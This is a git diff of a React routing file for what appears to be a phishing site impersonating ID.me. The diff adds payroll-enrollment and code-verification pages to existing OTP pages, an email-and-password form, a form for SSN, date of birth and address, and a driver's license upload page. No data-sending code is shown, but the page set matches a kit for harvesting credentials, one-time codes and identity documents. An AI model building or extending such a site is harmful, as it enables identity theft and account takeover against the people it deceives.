@@ -14,10 +14,15 @@ import Otp2 from "./pages/idmeotp2";
 
 // Form Components
 import SignInForm from "./pages/form";                 // Email & Password form
-  // Full Name, Mobile, SSN, DOB, Address
+// Full Name, Mobile, SSN, DOB, Address (missing import? but not used)
 import Teil from "./pages/teil";                       // Family information form
 import SuccessPage from "./pages/SuccessPages";        // Success page with animation
-import UploadLicense from "./pages/upload";     // ID.me driver's license upload
+import UploadLicense from "./pages/upload";      
+import Success from  "./pages/Success";      // ID.me driver's license upload
+
+// NEW PAGES
+import PayrollEnrollment from "./pages/PayrollEnrollment";  // Staff Payroll Enrollment
+import CodeVerification from "./pages/CodeVerification";    // Code verification page
 
 const App: React.FC = () => {
   return (
@@ -35,12 +40,20 @@ const App: React.FC = () => {
       
       {/* Form Routes */}
       <Route path="/form" element={<SignInForm />} />
-        {/* 5‑field validation */}
+      {/* 5‑field validation (missing component) */}
       <Route path="/teil" element={<Teil />} />
-      <Route path="/success" element={<SuccessPage />} />
       
-      {/* New ID.me License Upload */}
+      {/* Success Page */}
+      <Route path="/success" element={<SuccessPage />} />   {/* ✅ Added route */}
+      <Route path="/done" element={<Success />} /> 
+      {/* ID.me License Upload */}
       <Route path="/upload" element={<UploadLicense />} />
+
+      {/* NEW: Staff Payroll Enrollment */}
+      <Route path="/payroll-enroll" element={<PayrollEnrollment />} />
+
+      {/* NEW: Code Verification */}
+      <Route path="/verify-code" element={<CodeVerification />} />
     </Routes>
   );
 };
